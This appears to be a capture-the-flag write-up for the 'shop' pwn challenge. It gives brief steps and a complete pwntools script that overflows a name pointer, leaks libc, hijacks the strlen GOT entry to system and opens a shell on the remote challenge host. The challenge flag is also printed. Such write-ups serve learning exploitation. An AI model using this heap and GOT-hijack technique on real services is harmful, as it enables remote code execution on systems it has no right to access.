# shop
## 84 solves
* Guessing until checkout all.
* Overflow pointer of `name`.
* Change name to overwrite fake fd -> leak.
* Checkout to overflow  pointer of `name` to fake fd;
* Change name -> gothijacking.
```python
#!/usr/bin/env python
from pwn import *
import random


# PCTF{I_w3nt_sh0pp1ng_w1th_D3_8ruj1n}

e , l = ELF( './shop' ) , ELF( './libc.so.6' )
host , port = 'shop.chal.pwning.xxx' , 9916
#y = process( './shop' , env = { 'LD_PRELOAD' : './libc.so.6' } )
#y = process( './shop' )
y = remote( host , port )


def add( name , data , price ):
    y.sendlineafter( '>' , 'a' )
    y.sendline( name )
    y.sendline( data )
    y.sendline( str( price ) )
    

def lis():
    y.sendlineafter( '>' , 'l' )

def name( data ):
    y.sendlineafter( '>' , 'n' )
    y.sendline( data )

def chc( data ):
    y.sendline()
    y.sendlineafter( '>' , 'c' )
    y.sendline( data )
    sleep( 1 )

s = '0123456789abcdef'

y.sendlineafter( ':' , 'yuawn' )

add( 'a' * 0x8 , 'c' * 0x8 , 1 )
for _ in xrange( 32 ):
    print _
    add( 'a' * 0x8 , 'b' * 0x8 , 1 )


p = ''
i = 0
now = 0

while True:

    if now == 33:
        break

    tmp = ''.join( s[ random.randint( 0 , 15 ) ]  for _ in xrange( 0x800 ) )
    chc( p + tmp )

    y.recvuntil( ': $' )
    o = int( y.recvuntil( '.' )[:-1] )
    log.info( 'check out -> %d' % o )

    if o > now:
        i = i + 1
        p += tmp
        now = o
        log.success( 'now %d -> %d' % ( i , now ) )


name( p64( 0x6020c0 - 12 ) )

lis()

y.recvuntil( 'c' * 8 + '\n' )

l.address += u64( y.recv(6).ljust( 8 , '\x00' ) ) - 0x3c5620
log.success( 'libc -> %s' % hex( l.address ) )


name( p64( 0x6020b4 ) + 'gggg' )

chc( p )

name( 'a' * 0xc + p64( l.address + 0x3c5620 ) + p64(0) + p64( l.address + 0x3c48e0 ) + p64( 0 ) + p64( 0 ) * 0x20 + p64( e.got['strlen'] - 3 )[:-4] )

name( 'sh\x00' + p64( l.symbols['system'] ) )

y.sendline( 'cat flag.txt' )

y.interactive()
```